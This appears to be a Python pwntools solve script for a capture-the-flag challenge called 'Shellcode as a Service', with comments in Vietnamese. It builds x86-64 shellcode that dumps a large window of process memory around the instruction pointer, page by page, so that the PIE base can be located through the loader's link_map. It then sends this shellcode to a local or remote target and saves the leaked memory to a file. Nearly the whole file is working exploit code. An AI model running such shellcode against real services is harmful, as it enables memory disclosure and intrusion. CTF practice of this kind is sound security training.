#!/usr/bin/env python3
"""
CyLab 213 - SaaS - BUOC 1: dump cua so bo nho quanh RIP (trong RWX page)
de tim offset toi 'struct link_map'/l_addr (PIE base) trong ld.
Moi page: ghi 8 byte dia chi page, roi ghi 0x1000 byte noi dung (neu mapped).
"""
from pwn import *
import sys

context.log_level = 'error'
context.arch = 'amd64'
BIN = './chall'

prog = shellcraft.__class__  # unused
# Dung asm truc tiep voi label scratch
sc_asm = '''
    lea rbx, [rip]              # rbx = dia chi ngay sau lea (rip-relative)
    mov r14, rbx
    sub r14, 0x200000
    and r14, -0x1000            # page-align window start
    mov r15, 0xA00              # 2560 pages (window 0xA00000)
loop:
    mov qword ptr [rip + scratch], r14
    lea rsi, [rip + scratch]
    mov rdi, 1
    mov rdx, 8
    mov rax, 1
    syscall                     # write(1, &scratch, 8)  -> dia chi page
    mov rsi, r14
    mov rdi, 1
    mov rdx, 0x1000
    mov rax, 1
    syscall                     # write(1, page, 0x1000) (EFAULT neu unmapped)
    add r14, 0x1000
    dec r15
    jnz loop
    mov rax, 60
    xor edi, edi
    syscall
    .balign 8
scratch:
    .quad 0
'''
sc = asm(sc_asm, vma=0)

def get_conn():
    if len(sys.argv) > 1:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BIN)

def main():
    p = get_conn()
    p.sendafter(b'Welcome to Shellcode as a Service!\n', sc)
    data = p.recvall(timeout=20)
    open(sys.argv[3] if len(sys.argv) > 3 else 'dump.bin', 'wb').write(data)
    log.info(f'received {len(data)} bytes; saved dump')
    p.close()

if __name__ == '__main__':
    main()